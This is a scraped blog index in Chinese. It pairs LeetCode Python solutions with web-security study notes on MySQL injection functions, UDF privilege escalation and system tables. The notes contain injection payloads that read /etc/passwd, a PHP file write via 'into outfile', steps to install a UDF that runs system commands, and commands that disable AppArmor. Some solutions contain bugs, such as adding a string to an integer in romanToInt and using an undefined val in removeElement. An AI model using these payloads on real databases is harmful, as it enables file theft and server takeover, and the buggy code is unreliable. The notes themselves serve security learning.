&quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; for index, value in enumerate(nums): left = target-value if left in nums[(index+1):]: left_index = nums.index(left) if index == left_index: left_index = left_index + nums[left_index+1:].index(left) + 1 return [index, left_index] return [] 方法二 参考了大神们的解法，通过哈希来求解，这里通过字典来模拟哈希查询的过程。 个人理解这种办法相较于方法一其实就是字典记录了 num1 和 num2 的值和位置，而省了再查找 num2 索引的步骤。 1234567891011121314class Solution(object): def twoSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; hashmap = &#123;&#125; for key, value in enumerate(nums): hashmap[value] = key for i, num in enumerate(nums): j = hashmap.get(target - num) if j is not None and j != i: return [i, j] #7 reverse-integer 整数反转 Question 给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。 注意: 假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231, 231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。 Example 示例 1: 12输入: 123输出: 321 示例 2: 12输入: -123输出: -321 示例 3: 12输入: 120输出: 21 Solution 方法一 首先想到的肯定是将int类型转换成str类型，逆置后再转换成int类型。 12345678910111213141516class Solution(object): def reverse(self, x): &quot;&quot;&quot; :type x: int :rtype: int &quot;&quot;&quot; if x &gt; 0: x = int(str(x)[::-1]) else: x= int(&#x27;-&#x27; + str(abs(x))[::-1]) if x &lt; 2**31 and x &gt; -2**31: return x else: return 0 这个代码最巧妙的地方就在于使用了切片这种特性来直接逆置字符串。 方法二 我们想重复“弹出” x的最后一位数字，并将它“推入”到 rev 的后面。最后，rev 将与 x相反。 要在没有辅助堆栈 / 数组的帮助下 “弹出” 和 “推入” 数字，我们可以使用数学方法。 1234567//pop operation:pop = x % 10;x /= 10;//push operation:temp = rev * 10 + pop;rev = temp; Extra 数值交换：x, y = y, x int to list：l = [int(x) for x in str(num)] list to int： 使用列表生成器： 12s = [str(i) for i in list]res = int(&#x27;&#x27;.join(s)) 使用map函数：res = int(''.join(map(str, list))) #9 palindrome-number 回文数 Question 判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。 Example 示例 1: 123输入: 121输出: true示例 2: 示例2： 123输入: -121输出: false解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。 示例3： 123输入: 10输出: false解释: 从右向左读, 为 01 。因此它不是一个回文数。 Solution 1234567891011121314class Solution(object): def isPalindrome(self, x): &quot;&quot;&quot; :type x: int :rtype: bool &quot;&quot;&quot; if x &gt; 0: y = int(str(x)[::-1]) if x == y: return True elif x == 0: return True else: return False #13_roman-to-integer 罗马数字转整数 Question 罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。 字符 数值 I 1 V 5 X 10 L 50 C 100 D 500 M 1000 例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做 XXVII, 即为 XX + V + II 。 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况： I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。 X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。 给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。 Example 示例 1: 12输入: &quot;III&quot;输出: 3 示例 2: 12输入: &quot;IV&quot;输出: 4 示例 3: 12输入: &quot;IX&quot;输出: 9 示例 4: 123输入: &quot;LVIII&quot;输出: 58解释: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3. 示例 5: 123输入: &quot;MCMXCIV&quot;输出: 1994解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4. Solution 方法一 思路：从左往右一位一位的看，如果这一位数字比它右边一位的数字大或与其相等，则加上这一位代表的值，如果它比右边一位小，则减去这一位代表的数字。 例如： ‘MMCMLXIV’: 第一位是M，它的后一位也是M，所以 num = 0 + 1000，之后 M &gt; C, num = num + 1000 =2000,之后到特殊值，因为C&lt;M，所以num=num-C =2000-100=1900,之后再加上1000得到 num=2900……以此类推进行下去，最后可得到 num = 2964 需要注意的是，位与后一位的比较只需进行到倒数第二位即可，因为最后一位没有比它小的一位能够进行比较，直接加上最后一位代表的值即可。 判断到倒数第二位时，如果最后一个数比前一个数大，程序就会直接减去倒数第二个数，然后直接加上最后一个数就行了。所以最后一个数不管比前面的数大还是小都会直接加上它的值。 123456789101112131415161718class Solution(object): def romanToInt(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; roman_dict = &#123;&#x27;M&#x27;: 1000, &#x27;D&#x27;: 500, &#x27;C&#x27;: 100, &#x27;L&#x27;: 50, &#x27;X&#x27;: 10, &#x27;V&#x27;: 5, &#x27;I&#x27;: 1&#125; sum = 0 for i in range(len(s) - 1): if roman_dict.get(s[i]) &gt;= roman_dict.get(s[i+1]): sum += roman_dict.get(s[i]) else: sum -= roman_dict.get(s[i]) last_num = s[len(s) - 1] sum += last_num return sum 方法二 思路： 构建一个字典记录所有罗马数字子串，注意长度为2的子串记录的值是**（实际值 - 子串内左边罗马数字代表的数值）**。 这样一来，遍历整个 s 的时候判断当前位置和前一个位置的两个字符组成的字符串是否在字典内，如果在就记录值，不在就说明当前位置不存在小数字在前面的情况，直接记录当前位置字符对应值。 123456789class Solution(object): def romanToInt(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; roman_dict = &#123;&#x27;M&#x27;: 1000, &#x27;D&#x27;: 500, &#x27;C&#x27;: 100, &#x27;L&#x27;: 50, &#x27;X&#x27;: 10, &#x27;V&#x27;: 5, &#x27;I&#x27;: 1, &#x27;IV&#x27;: 3, &#x27;IX&#x27;: 8, &#x27;XL&#x27;: 30, &#x27;XC&#x27;: 80, &#x27;CD&#x27;: 300, &#x27;CM&#x27;: 800&#125; return sum(roman_dict.get(s[max(i-1, 0): i+1], roman_dict[n]) for i, n in enumerate(s)) Extra sum(iterable, [start]) -&gt; number 生成器（generator） g = (x * x for x in range(10)) 1234567891011- 如果一个函数定义中包含&#96;yield&#96;关键字，那么这个函数就不再是一个普通函数，而是一个generator： &#96;&#96;&#96;python def fib(max): n, a, b &#x3D; 0, 0, 1 while n &lt; max: yield b a, b &#x3D; b, a + b n &#x3D; n + 1 return &#39;done&#39; #14 longest-common-prefix 最长公共前缀 Question 编写一个函数来查找字符串数组中的最长公共前缀。 如果不存在公共前缀，返回空字符串 &quot;&quot;。 所有输入只包含小写字母 a-z 。 Example 示例1 12输入: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]输出: &quot;fl&quot; 示例2 123输入: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]输出: &quot;&quot;解释: 输入不存在公共前缀。 Solutions 方法一 思路： 首先想到列表为空的情况，返回空字符串。 第一个字符串的第一位与第二个字符串的第一位比较，若相同则继续将第二个字符串的第一位和第三个字符串第一位比较，依次类推。若比较到第j和j+1个字符串的第k位不同则返回第一个字符串的前j个子串（不包括第j个字符。 若最后所有字符串都相同，则返回第一个字符串长度为strs中元素的长度最小的子串。 12345678910111213141516class Solution(object): def longestCommonPrefix(self, strs): &quot;&quot;&quot; :type strs: List[str] :rtype: str &quot;&quot;&quot; if len(strs) == 0: return &#x27;&#x27; min_len = min(list(map(len, [strs[i] for i in range(len(strs))]))) for j in range(min_len): for k in range(len(strs) - 1): if strs[k][j] != strs[k+1][j]: return strs[0][:j] return strs[0][:min_len] if min_len else &#x27;&#x27; 方法二 思路： 利用zip函数解包以及set判断是否相同，来对每一个单词的同一位置的字母进行比较 1234567891011121314class Solution: def longestCommonPrefix(self, strs): &quot;&quot;&quot; :type strs: List[str] :rtype: str &quot;&quot;&quot; res = &quot;&quot; for tmp in zip(*strs): tmp_set = set(tmp) if len(tmp_set) == 1: res += tmp[0] else: break return res Extra *解包操作： 1234567891011&gt;&gt;&gt; def func(a,b,c):... print(a,b,c)&gt;&gt;&gt; func(*[1,2,3])1 2 3&gt;&gt;&gt; func(*(1,2,3))1 2 3&gt;&gt;&gt; func(*&quot;abc&quot;)a b c&gt;&gt;&gt; func(*&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3&#125;)a b c zip()函数 把两个或多个数组的所有元素按索引对齐，然后按索引合并成新数组。 set中不允许有重复的元素存在。 #20 valid-parentheses 有效括号 Question 给定一个只包括 ‘(’，’)’，’{’，’}’，’[’，’]’ 的字符串，判断字符串是否有效。 有效字符串需满足： 左括号必须用相同类型的右括号闭合。 左括号必须以正确的顺序闭合。 注意空字符串可被认为是有效字符串。 Example 示例1 12输入: &quot;()&quot;输出: true 示例2 12输入: &quot;()[]&#123;&#125;&quot;输出: true 示例3 12输入: &quot;(]&quot;输出: false 示例4 12输入: &quot;([)]&quot;输出: false 示例5 12输入: &quot;&#123;[]&#125;&quot;输出: true Solution 方法一 思路 首先空字符串返回True 栈先入后出特点恰好与本题括号排序特点一致，即若遇到左括号入栈，遇到右括号时将对应栈顶左括号出栈，则遍历完所有括号后 stack 仍然为空； 需要注意的是若栈为空，且此时读取到的字符是right_par，则直接返回False 1234567891011121314151617181920212223242526272829class Solution(object): def isValid(self, s): &quot;&quot;&quot; :type s: str :rtype: bool &quot;&quot;&quot; if s == &#x27;&#x27;: return True left_par = [&#x27;(&#x27;, &#x27;[&#x27;, &#x27;&#123;&#x27;] right_par = [&#x27;)&#x27;, &#x27;]&#x27;, &#x27;&#125;&#x27;] if s[0] in right_par: return False l = [] for i in range(len(s)): if s[i] in left_par: l.append(s[i]) elif l == [] and s[i] in right_par: return False else: if left_par.index(l.pop(-1)) != right_par.index(s[i]): return False if l == []: return True else: return False 方法二 ​ 其实思路是一样的，关键是用字典来替换方法一的两个初始列表 12345678class Solution: def isValid(self, s: str) -&gt; bool: dic = &#123;&#x27;&#123;&#x27;: &#x27;&#125;&#x27;, &#x27;[&#x27;: &#x27;]&#x27;, &#x27;(&#x27;: &#x27;)&#x27;, &#x27;?&#x27;: &#x27;?&#x27;&#125; stack = [&#x27;?&#x27;] for c in s: if c in dic: stack.append(c) elif dic[stack.pop()] != c: return False return len(stack) == 1 解析 stack初始化的时候为什么要加一个? 栈 stack 为空时， stack.pop() 操作会报错；因此，我们采用一个取巧方法，给 stack 赋初值 ?，并在哈希表 dic中建立 key: '?'，value:'?'key的对应关系予以配合。此时当 stack 为空且 c 为右括号时，可以正常提前返回 false。 Extra Python模拟栈的操作 压栈：list.append() 出栈：list.pop() range([start,] end)：start默认是0，返回start - (end-1)的迭代器。 #21 merge-two-sorted-lists 合并两个有序链表 Question 将两个有序链表合并为一个新的有序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 Example 示例 12输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 Solution 方法一 思路 要考虑到l1或l2为None的情况下，直接返回非空的链表。 将两个链表的元素中val分别存入两个列表，拼接这两个列表后进行排序，把排序后的列表中的元素组成一个新的链表。 123456789101112131415161718192021222324252627282930313233343536373839404142# Definition for singly-linked list.# class ListNode(object):# def __init__(self, x):# self.val = x# self.next = Noneclass Solution(object): def mergeTwoLists(self, l1, l2): &quot;&quot;&quot; :type l1: ListNode :type l2: ListNode :rtype: ListNode &quot;&quot;&quot; if l1 is None: return l2 if l2 is None: return l1 tmp1, tmp2 = [], [] while l1: tmp1.append(l1.val) l1 = l1.next while l2: tmp2.append(l2.val) l2 = l2.next l3 = sorted(tmp1 + tmp2) l = ListNode(l3[0]) l.next = None p = l for i in range(1, len(l3)): tmp = ListNode(l3[i]) tmp.next = None p.next = tmp p = tmp return l 方法二 思路 首先，我们设定一个哨兵节点 prehead ，这可以在最后让我们比较容易地返回合并后的链表。我们维护一个 prev 指针，我们需要做的是调整它的 next 指针。然后，我们重复以下过程，直到 l1 或者l2指向了 null ：如果 l1 当前位置的值小于等于 l2 ，我们就把 l1 的值接在 prev 节点的后面同时将 l1 指针往后移一个。否则，我们对 l2 做同样的操作。不管我们将哪一个元素接在了后面，我们都把prev 向后移一个元素。 在循环终止的时候， l1 和 l2 至多有一个是非空的。由于输入的两个链表都是有序的，所以不管哪个链表是非空的，它包含的所有元素都比前面已经合并链表中的所有元素都要大。这意味着我们只需要简单地将非空链表接在合并链表的后面，并返回合并链表。 1234567891011121314151617181920212223242526272829# Definition for singly-linked list.# class ListNode(object):# def __init__(self, x):# self.val = x# self.next = Noneclass Solution(object): def mergeTwoLists(self, l1, l2): &quot;&quot;&quot; :type l1: ListNode :type l2: ListNode :rtype: ListNode &quot;&quot;&quot; prehead = ListNode(-1) prev = prehead while l1 and l2: if l1.val &lt;= l2.val: prev.next = l1 l1 = l1.next else: prev.next = l2 l2 = l2.next prev = prev.next prev.next = l1 if l1 is not None else l2 return prehead.next Extra 连接两个列表：list1 + list2 sort()和sorted()的区别 sort是容器的函数：sort(cmp=None, key=None, reverse=False) sorted是python的内建函数：sorted(iterable, cmp=None, key=None, reverse=False) 即：sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。 对于一个无序的列表a，调用a.sort()，对a进行排序后返回a，sort()函数修改待排序的列表内容。 而对于同样一个无序的列表a，调用sorted(a)，对a进行排序后返回一个新的列表，而对a不产生影响。 key：用来指定一个函数，此函数在每次元素比较时被调用，此函数代表排序的规则，也就是你按照什么规则对你的序列进行排序； reverse：是用来表明是否逆序，默认的False情况下是按照升序的规则进行排序的，当reverse=True时，便会按照降序进行排序。 #26_remove-duplicates-from-sorted-array Question 给定一个排序数组，你需要在原地删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。 不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。 为什么返回数值是整数，但输出的答案是数组呢? 请注意，输入数组是以“引用”方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。 你可以想象内部操作如下: 12345678&#x2F;&#x2F; nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝int len &#x3D; removeDuplicates(nums);&#x2F;&#x2F; 在函数里修改输入数组对于调用者是可见的。&#x2F;&#x2F; 根据你的函数返回的长度, 它会打印出数组中该长度范围内的所有元素。for (int i &#x3D; 0; i &lt; len; i++) &#123; print(nums[i]);&#125; Example 示例1 123456789给定数组 nums &#x3D; [1,1,2], 函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 你不需要考虑数组中超出新长度后面的元素。来源：力扣（LeetCode）链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;remove-duplicates-from-sorted-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 示例2 12345给定 nums &#x3D; [0,0,1,1,1,2,2,3,3,4],函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。你不需要考虑数组中超出新长度后面的元素。 Solution 思路 我们可以放置两个指针i和j，其中i是慢指针，而j是快指针。只要 nums[i] = nums[j]，我们就增加j以跳过重复项。 当我们遇到nums[i] = nums[j]时，跳过重复项的运行已经结束，因此我们必须把它nums[j]的值复制到 nums[i + 1]。然后递增i，接着我们将再次重复相同的过程，直到j到达数组的末尾为止。 12345678910111213class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; i = 0 for j in range(1, len(nums)): if nums[i] != nums[j]: i = i+1 nums[i] = nums[j] return i+1 #27_remove-element Question 给定一个数组 nums 和一个值 val，你需要原地移除所有数值等于 val 的元素，返回移除后数组的新长度。 不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。 元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。 Example 示例一 12345给定 nums = [3,2,2,3], val = 3,函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。 示例二 1234567给定 nums = [0,1,2,2,3,0,4,2], val = 2,函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。注意这五个元素可为任意顺序。你不需要考虑数组中超出新长度后面的元素。 Solution 方法一 思路 首先遍历循环nums，并使用count来计数有多少个待删除的元素； 再执行count次remove函数删除nums中值为val的元素 1234567891011class Solution: def removeElement(self, nums: List[int], val: int) -&gt; int: count = 0 for i in range(len(nums)): if nums[i] == val: count = count+1 for j in range(count): nums.remove(val) return len(nums) 方法二 思路 这道题的思路和 删除排序数组中的重复项解法类似 12345678910111213class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; i = 0 for j in range(len(nums)): if nums[j] != val: nums[i] = nums[j] i = i+1 return i #28_implement-strstr Question 实现 strStr() 函数。 给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回 -1。 说明: 当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。 对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与C语言的 strstr() 以及 Java的 indexOf() 定义相符。 Example 示例一 12输入: haystack &#x3D; &quot;hello&quot;, needle &#x3D; &quot;ll&quot;输出: 2 示例二 12输入: haystack &#x3D; &quot;aaaaa&quot;, needle &#x3D; &quot;bba&quot;输出: -1 Solution 方法一 思路 若needle为空字符串，则返回0； 若needle的首字符不在haystack中，则返回-1； 循环遍历haystack，找到needle首字符在haystack的起始位置，向后比较needle_len长度的子字符串。 1234567891011121314class Solution: def strStr(self, haystack: str, needle: str) -&gt; int: needle_len = len(needle) if needle_len == 0: return 0 char = needle[0] if char not in haystack: return -1 else: for i in range(len(haystack)): if char == haystack[i]: if haystack[i:(i+needle_len)] == needle: return i return -1 方法二 思路 和方法一的思路相似，只是代码写的更为简洁，但是感觉更为暴力。 123456class Solution: def strStr(self, haystack: str, needle: str) -&gt; int: for i in range(len(haystack) - len(needle)+1): if haystack[i:i+len(needle)] == needle: return i return -1 #35_search_insert_position Question 给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。 你可以假设数组中无重复元素。 Example 示例一 12输入: [1,3,5,6], 5输出: 2 示例二 12输入: [1,3,5,6], 2输出: 1 示例三 12输入: [1,3,5,6], 7输出: 4 Solution 方法一 思路 如果target在nums中，则直接返回索引； 否则将target添加在nums列表后面，再对其进行排序，最后返回索引。 1234567class Solution: def searchInsert(self, nums: List[int], target: int) -&gt; int: if target in nums: return nums.index(target) nums.append(target) nums.sort() return nums.index(target) 这种方法其实比较取巧，而题目的意图是想要考察二分查找。 方法二 思路 二分法查找 12345678910111213class Solution: def searchInsert(self, nums: List[int], target: int) -&gt; int: low = 0 high = len(nums) while low &lt; high: mid = low + (high - low)/2 if nums[mid] &gt; target: high = mid elif nums[mid] &lt; target: low = mid +1 else: return mid return low","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://ca0y1h.top/tags/Leetcode/"},{"name":"算法","slug":"算法","permalink":"http://ca0y1h.top/tags/%E7%AE%97%E6%B3%95/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"算法","slug":"编程/算法","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/%E7%AE%97%E6%B3%95/"}]},{"title":"Web安全学习之数据库系统功能相关学习","date":"2019-09-05T08:48:01.000Z","path":"Web_security/basic_learning/4.数据库系统功能相关学习/","text":"Web安全学习之数据库系统功能相关学习 任务目标 学习数据库自带函数的功能和用法（思考在什么情况下可以使用）； 将所有涉及的函数进行测试并举例说明其用法； 扩展学习：针对不同数据库构造所需环境，尝试执行系统命令。 0x01 MySQL常用函数 在进行sql注入过程中，会使用到mysql中的内置函数。在内置函数中，又分为获取信息的函数和功能函数。 信息函数是用来获取mysql中的数据库的信息，功能函数就是传统的函数用来完成某项操作。 常用的信息函数 database()：用于获取当前使用的数据库信息 version()：返回数据库的版本 user()：返回当前的用户（等价于current_user参数） @@datadir：获取数据库的存储位置 常见的功能函数 load_file()：从计算机中载入文件，读取文件中的数据 12select * from table union select 1, load_file(&#39;&#x2F;etc&#x2F;passwd&#39;), 3select * from table union select 1, load_file(0x2F6574632F706173737764), 3 #使用十六进制绕过单引号限制 into_outfile()：写入文件，前提是具有写入条件 1select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;&#x2F;tmp&#x2F;xxx.php&#39;; concat()：返回两个参数相连接产生的字符串。如果其中一个参数为NULL，则返回值为NULL。 group_concat()：用于合并多条记录中的结果。用法如下： 返回的就是users表中所有的用户名，并且是作为一条记录返回。 substr()：用于截断字符串。用法为：substr(str, pos, length)，注意pos是从1开始的。 ascii()：返回字符所对应的ascii码。 1select ascii(&#39;a&#39;); #返回97 length()：返回字符串的长度。 1select length(&#39;123456&#39;) #返回6 if(exp1, exp2, exp3)：如果exp1是True，则返回exp2；否则返回exp3。如： 12select 1,2,if(1&#x3D;1,3,-1) #1,2,3select 1,2,if(1&#x3D;2,3,-1) #1,2,-1 ifnull(exp1, exp2)：如果exp1是True，则返回exp1；否则返回exp2。如： 1select ifnull(sleep(2), 2); nullif(exp1, exp2)：如果exp1==exp2，则返回Null；否则返回exp2。 以上就是在进行sql注入工程中常用的函数。当然还存在一些使用的不是很多的函数。 0x02 Linux MySQL UDF提权 Step1 获取UDF文件 查看MySQL版本 1select version(); Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下 查找Plugin目录 1select @@plugin_dir; 查看系统版本 12show variables like &#39;%compile%&#39;; 在Kali Linux中找到合适的UDF 注：新版sqlmap 为了防止文件被误杀，对文件进行异或加密，需要使用/usr/share/sqlmap/extra/cloak/路径下的cloak.py解密脚本对lib_mysqludf_sys.so_进行解码，即python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_得到lib_mysqludf_sys.so文件 Step2 上传UDF文件 首先确保MySQL允许对任意路径进行读写操作，即secure_file_priv = 将lib_mysqludf_sys.so传至/tmp/路径下，使用load_file()对其读取，并转换成十六进制文件后再写入/tmp/目录下： 12select hex(load_file(&#39;&#x2F;tmp&#x2F;lib_mysqludf_sys.so&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.hex&#39; 读取udf.hex文件的内容，并上传至/usr/bin/mysql/plugin/： 12select 0x[udf.hex内容] into dumpfile &#39;&#x2F;usr&#x2F;bin&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39; Step3 执行命令 安装UDF 12create function sys_eval returns string sonme &#39;udf.so&#39;; 执行系统命令 0x03 踩过的坑 在设置 secure_file_privilege='' 且目录权限为 777 后load_file() 无法读取文件。 检查Apparmor配置 检查文件的用户组是否是属于mysql 无法上传udf.so至/usr/bin/mysql/plugin/目录。 检查该目录的其他组用户受否有读写权限 检查文件的用户组是否是属于mysql 上传udf.so至指定目录后，create function失败。 UDF使用的版本和本机环境不匹配 没有对sqlmap中的UDF文件进行解码操作 使用select sys_eval();执行命令返回NULL。 取消Apparmor对mysqld service的限制 简单来说就是执行下面两个命令： 123sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"UDF提权","slug":"UDF提权","permalink":"http://ca0y1h.top/tags/UDF%E6%8F%90%E6%9D%83/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之MySQL的系统表、文件读写和Hash密码爆破","date":"2019-08-18T14:21:29.000Z","path":"Web_security/basic_learning/3.MySQL的系统表、文件读写和Hash密码爆破/","text":"Web安全学习之MySQL的系统表、文件读写和Hash密码爆破 任务目标 学习数据库系统表的功能，如何利用SQL语句查询库名、表名、字段名、内容以及当前用户等基本信息； 如何利用数据库的功能读写文件，需要什么样的条件才可以读写； 扩展：查询用户的哈希值，并使用hashcat来对获取的hash进行暴力破解。 0x01 MySQL系统表 一、information_schema 数据库元数据： 元数据(meta data)——“data about data” 关于数据的数据，一般是结构化数据（如存储在数据库里的数据，规定了字段的长度、类型等）。所以metadata就是描述数据的数据，在MySQL中就是描述database的数据。有哪些数据库、每个表有哪些表、表有多少字段、字段是什么类型等等，这样的数据就是数据库的元数据。 综上，我们可以称information_schema是一个元数据库。它就像物业公司的信息库，对管理的每栋大厦有多少电梯、电梯型号、每个房间的长宽高等等了如指掌。 SCHEMATA 提供数据库信息，有哪些数据库，字符集是GBK还是UTF-8等等。 所有字段名： 其中某一条数据： 命令SHOW DATABASES;的结果取自此表 TABLES 提供表的信息，数据库有哪些表，是什么存储引擎等等。 所有字段名： 常用字段包含： 字段名 含义 备注 TABLE_SCHEMA 数据库名 TABLE_NAME 表名 TABLE_TYPE 表的类型 ENGINE 存储引擎 CREATE_TIME 建表时间 其中某几条记录： 命令SHOW TABLES;的结果取自此表 COLUMNS 提供字段的信息，有哪些字段字段类型是什么等等。 所有字段名： 常用字段名： 字段名 含义 备注 SCHEMA_NAME 数据库名 TABLE_NAME 表名 COLUMN_NAME 字段名 COLUMN_TYPE 字段类型 如int(10),varchar(250) 其中某几条记录： 等同命令：SHOW COLUMNS 或者 desc learnSQL.customers 看emp表的具体字段。 STATISTICS 这张表的单词是统计的意思，但是却是索引的信息。 什么是索引 所有字段名： 字段名 含义 备注 SCHEMA_NAME 数据库名 TABLE_NAME 表名 INDEX_SCHEMA 也是数据库名 INDEX_NAME 索引名 COLUMN_NAME 字段名 INDEX_TYPE 索引类型 一般是B-Tree 其中几条记录： 等同于命令：SHOW INDEX; TABLE_CONSTRAINTS 提供约束情况，我们想看看表有哪些约束？约束指的是唯一性约束、主键约束、外键约束。 所有字段名： 常用字段名： 字段名 含义 备注 CONSTRAINT_SCHEMA 数据库名 CONSTRAINT_NAME 约束名 TABLE_SCHEMA 也是数据库名 TABLE_NAME 表名 CONSTRAINT_TYPE 约束类型 UNIQUE、PRIMARY KEY、FOREIGN KEY 其中几条记录： 唯一约束和主键约束，我们在前面的索引中一样可以查到 KEY_COLUMN_USAGE 有STATISTICS和TABLE_CONSTRAINTS表，为什么还需要KEY_COLUMN_USAGE？ 因为外键时没有指出参考的是哪张表的哪个字段！ 所有字段： 常用字段： 字段名 含义 备注 CONSTRAINT_SCHEMA 数据库名 CONSTRAINT_NAME 约束名 PRIMARY或列名或外键名 TABLE_SCHEMA 也是数据库名 TABLE_NAME 表名 COLUMN_NAME 列名 REFERENCED_TABLE_SCHEMA 参考的数据库 REFERENCED_TABLE_NAME 参考的表 REFERENCED_COLUMN_NAME 参考的列 其中几条记录： 相比前面两个，KEY_COLUMN_USAGE这个表的信息是最全的。包括主键、外键、唯一约束。 VIEWS 查询数据库下所有的视图。 所有字段名： 常用字段名： 字段名 含义 备注 TABLE_SCHEMA 数据库名 TABLE_NAME 表名 VIEW_DEFINITION 视图定义语句 其他部分表 ENGINES：列举了当前数据库对InnoDB、MEMORY、MyISAM等各种存储引擎的支持情况。等同show ENGINES GLOBAL_VARIABLES：服务器变量设置，一些开关和设置。等同命令show global variables。除了global还有session。 PLUGINS：MySQL的插件列表。可以看到存储引擎InnoDB甚至binlog都是插件！binlog是强制加载的，InnoDB是默认打开的。等同命令show PLUGINS PROCESSLIST：查看正在运行的线程！比如我查这个表，就看到一个查询的线程。等同命令show full processlist 二、Performance_schema 主要用于收集数据库服务器性能参数。并且库里表的存储引擎均为PERFORMANCE_SCHEMA，而用户是不能创建存储引擎为PERFORMANCE_SCHEMA的表。MySQL5.7默认是开启的。 参考：Performance_schema 三、mysql mysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。(常用的，在mysql.user表中修改root用户的密码)。 如何利用SQL语句查询库名、表名、字段名、内容以及当前用户等基本信息 查询库名：SELECT schema_name FROM infomation_schema.schemata; 查询表名：SELECT table_name FROM information_schema.tables WHERE table_schema='test'; 查询字段名：SELECT column_name FROM information_schema.columns WHERE table_name='col'; 查询记录：SELECT * FORM test.col; 0x02 读写文件 一、利用数据库读取文件 使用system命令 查看文件 12345678910111213141516171819202122232425262728293031323334353637383940414243mysql&gt; system cat 